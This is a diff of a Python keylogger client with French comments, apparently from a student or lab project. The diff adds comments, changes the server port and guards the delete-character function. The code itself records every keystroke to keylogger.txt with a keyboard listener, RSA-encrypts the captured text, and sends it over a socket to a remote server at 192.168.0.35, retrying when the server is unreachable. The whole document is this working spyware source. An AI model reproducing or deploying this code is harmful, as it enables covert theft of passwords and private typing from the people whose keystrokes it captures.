@@ -7,25 +7,26 @@ import os
 import rsa
 
 
-
+# Fonction qui permet de lire les données du fichier keylogger.txt
 def read_data_from_file(file_path):
     with open(file_path, 'r') as file:
         data = file.read()
     return data
 
-
+# Fonction qui permet d'ajouter un caractère dans le fichier keylogger.txt
 def add_one_char(char):
     with open('keylogger.txt', "a") as f:
         f.write(char)
 
-
+# Fonction qui permet de supprimer un caractère dans le fichier keylogger.txt
 def del_one_char():
     with open('keylogger.txt', 'rb+') as f:
         f.seek(0,2)
         size=f.tell()
-        f.truncate(size-1)
+        if size > 17 :
+            f.truncate(size-1)
 
-
+# Fonction qui permet d'enregistrer les touches appuyées 
 def record_key(key):
 
     if str(key) == "Key.enter":
@@ -40,7 +41,7 @@ def record_key(key):
     elif hasattr(key, 'char'):
         add_one_char(key.char)
 
-
+# Fonction qui permet d'arrêter le client
 def stop_client(conn, listener, filepath):
 
     # arrêt du listener
@@ -54,7 +55,7 @@ def stop_client(conn, listener, filepath):
 
     exit(0)
 
-
+# Fonction qui permet d'établir la connexion
 def create_conn(host, port):
 
     # création du socket
@@ -74,6 +75,7 @@ def create_conn(host, port):
             t1 = t2
 
             try:
+                # connexion au serveur
                 client_socket.connect((host, port))
                 return client_socket
 
@@ -95,10 +97,11 @@ def create_conn(host, port):
 listener = keyboard.Listener(on_press=record_key)
 listener.start()
 
-
+# configuration du socket
 host = '192.168.0.35'
-port = 8442
+port = 8443
 
+# clé publique du serveur
 pubkey = '''-----BEGIN RSA PUBLIC KEY-----
 MIGJAoGBANGsb2/kIGSPoXqfdTJ0kC2k8oBZq5C7fTLSpdN+ksGRs37Uhp4B0cfg
 doPS3kTdfJpwQGHDUYF0wc1EQ4lacgTL7jVhwoxfUNw9HiaZpE5U7NFr9WVtxyAt
@@ -106,7 +109,7 @@ SE4XsmhN+I4FCQs2uy/Hq1Rd3KaqVnl8lf0cRfSJD2Om9ZuaRC+hAgMBAAE=
 -----END RSA PUBLIC KEY-----'''
 pubkey = rsa.PublicKey.load_pkcs1(pubkey.encode('utf-8'))
 
-
+# chemin du fichier keylogger.txt dans lequel seront stockées les données
 file_path = 'keylogger.txt'  
 
 #Vérifiction si le fichier keylogger.txt existe
@@ -121,7 +124,7 @@ conn = create_conn(host, port)
 running = True
 t1 = time.time()
 
-
+# boucle principale
 while running:
     try:
         t2 = time.time()
@@ -133,13 +136,16 @@ while running:
             # envoyer les données au serveur
             keyboard_data = read_data_from_file(file_path)
 
+            # chiffrement des données
             encrypted_data = rsa.encrypt(keyboard_data.encode(), pubkey)
 
+            # envoi des données
             conn.send(encrypted_data)
 
             # récupération du code de retour
             code = conn.recv(1024).decode("utf-8")
 
+            # Condition sur le code de retour
             if code == "OK":
                 print("code : OK")
 
@@ -152,7 +158,7 @@ while running:
                 raise ssl.SSLEOFError
 
 
-
+# si le serveur est injoignable
     except ssl.SSLEOFError:
         
         retries = 0
